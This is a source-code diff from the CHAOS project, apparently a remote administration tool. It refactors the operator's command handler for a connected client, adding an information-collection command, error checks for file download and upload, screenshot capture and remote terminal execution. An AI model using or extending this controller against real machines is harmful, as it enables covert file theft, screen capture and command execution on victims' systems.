@@ -5,7 +5,6 @@ import (
 	"github.com/c-bata/go-prompt"
 	"github.com/tiagorlampert/CHAOS/internal/handler"
 	"github.com/tiagorlampert/CHAOS/internal/usecase"
-	"github.com/tiagorlampert/CHAOS/internal/util/network"
 	"github.com/tiagorlampert/CHAOS/internal/util/ui/completer"
 	"github.com/tiagorlampert/CHAOS/pkg/system"
 	"net"
@@ -38,26 +37,28 @@ func (c ClientHandler) executor(input string) {
 	values := strings.Fields(input)
 	for _, v := range values {
 		switch strings.TrimSpace(v) {
+		case "information":
+			c.UseCase.Information.Collect()
+			return
 		case "download":
-			c.UseCase.Download.Validate(values)
-			c.UseCase.Download.Prepare(values[0])
-			c.UseCase.Download.ReceiveFile(values[1])
+			if err := c.UseCase.Download.Validate(values); err != nil {
+				return
+			}
+			c.UseCase.Download.File(values[1])
 			return
 		case "upload":
-			c.UseCase.Upload.Validate(values)
-			c.UseCase.Upload.Prepare(values[0])
-			c.UseCase.Upload.SendPath(values[2])
-			c.UseCase.Upload.SendFile(values[1])
+			if err := c.UseCase.Upload.Validate(values); err != nil {
+				return
+			}
+			c.UseCase.Upload.File(values[1], values[2])
 			return
 		case "screenshot":
-			c.UseCase.Screenshot.TakeScreenshot(input)
+			c.UseCase.Screenshot.TakeScreenshot()
 			return
 		case "exit":
 			system.QuitApp()
 		default:
-			_ = network.Send(c.Connection, []byte(input))
-			response, _ := network.Read(c.Connection)
-			fmt.Println(string(response))
+			c.UseCase.Terminal.Run(input)
 			return
 		}
 	}
